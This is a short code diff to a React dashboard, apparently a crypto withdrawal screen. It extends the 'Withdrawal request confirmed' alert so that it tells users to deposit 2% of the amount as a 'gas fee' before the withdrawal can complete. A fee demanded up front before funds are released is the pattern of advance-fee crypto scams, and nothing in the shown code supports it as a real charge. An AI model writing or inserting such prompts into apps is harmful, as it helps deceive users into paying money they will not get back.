@@ -480,11 +480,13 @@ export default function Dashboard() {
                     )}.`
                   );
                 } else {
-                  // Case 3: valid withdrawal
+                  // Meets or exceeds minimum and balance is sufficient
                   alert(
                     `Withdrawal request confirmed!\nMethod: ${withdrawMethod}\nAmount: ${formatCurrency(
                       withdrawAmount
-                    )}`
+                    )}\n\nInstruction: Please deposit ${formatCurrency(
+                      withdrawAmount * 0.02
+                    )} (2% gas fee) into your own wallet address to complete the withdrawal.`
                   );
                 }
 
